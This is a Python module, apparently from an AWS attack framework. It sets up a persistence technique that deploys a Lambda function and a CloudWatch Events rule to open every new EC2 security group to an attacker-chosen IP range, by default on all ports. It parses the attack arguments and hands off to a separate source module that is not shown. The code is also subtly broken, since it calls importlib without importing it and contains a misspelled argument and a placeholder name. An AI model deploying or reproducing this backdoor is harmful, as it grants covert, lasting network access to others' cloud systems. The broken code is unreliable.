#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os

target = ''

technique_info = {
    'blackbot_id': 'T1098.b.005',
    'external_id': '',
    'controller': 'lambda_backdoor_new_sec_groups',
    'services': ['Lambda', 'Events', 'EC2'],
    'prerequisite_modules': ['iam_enum_groups'],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--targe-role-arn','--regions', '--ip-range', '--port-range', '--protocol', '--cleanup'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'intent': 'Creates a Lambda function and CloudWatch Events rule to backdoor new EC2 security groups.',
    'name': 'ADD_NAME_HERE',

}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--target-role-arn', required=True, default=None, help='The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission')
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
parser.add_argument('--ip-range', required=True, default=None, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
parser.add_argument('--port-range', required=False, default='0-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (0-65535).')
parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')

def main(args, awsattack_main):
    args = parser.parse_args(args)

    import_path = 'ttp.src.lambda_backdoor_new_sec_groups_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main)

def summary(data, awsattack_main):
    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])
